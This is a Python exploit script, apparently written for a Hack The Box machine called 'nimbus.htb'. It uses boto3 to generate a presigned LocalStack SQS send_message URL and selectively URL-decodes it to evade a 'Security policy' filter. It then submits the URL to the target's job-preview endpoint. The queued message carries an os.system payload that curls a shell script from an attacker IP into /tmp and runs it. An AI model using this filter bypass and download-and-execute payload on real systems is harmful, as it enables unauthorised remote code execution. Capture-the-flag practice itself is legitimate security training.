import boto3
import requests
import re

ACCESS_KEY = "<REDACTED>"
SECRET_KEY = "<REDACTED>"
SESSION_TOKEN = ("<REDACTED_SESSION_TOKEN>")

LOCALSTACK = "http://172.18.0.2:4566"
QUEUE_URL = f"{LOCALSTACK}/<REDACTED_ACCOUNT_ID>/nimbus-jobs"

session = boto3.session.Session(
    aws_access_key_id=ACCESS_KEY,
    aws_secret_access_key=SECRET_KEY,
    aws_session_token=SESSION_TOKEN,
    region_name="us-east-1",
)
sqs = session.client("sqs", endpoint_url=LOCALSTACK)

bootstrap = '__import__("os").system("curl 10.10.14.180:8003/r.sh -o /tmp/r5.sh; sh /tmp/r5.sh")'
message_body = "script: '" + bootstrap + "'"

presigned_url = sqs.generate_presigned_url(
    "send_message",
    Params={"QueueUrl": QUEUE_URL, "MessageBody": message_body},
    ExpiresIn=300,
)

# Selectively un-encode everything except & = ? # + (structural query chars)
def selective_unquote(s):
    def repl(m):
        code = m.group(1).upper()
        ch = bytes.fromhex(code).decode("latin1")
        if ch in "&=?#+%":
            return m.group(0)
        return ch
    return re.sub(r"%([0-9A-Fa-f]{2})", repl, s)

modified_url = selective_unquote(presigned_url)
print("Modified URL:")
print(modified_url)
print()

final_url = modified_url + "&x=.yaml"
r = requests.post("http://nimbus.htb/jobs/preview", data={"url": final_url}, timeout=20)
verdict = "BLOCKED" if "Security policy" in r.text else ("FETCHED" if "Fetched:" in r.text else "OTHER")
print("verdict:", verdict)
open("http/E37_presigned_selective_response.txt", "w").write(r.text)
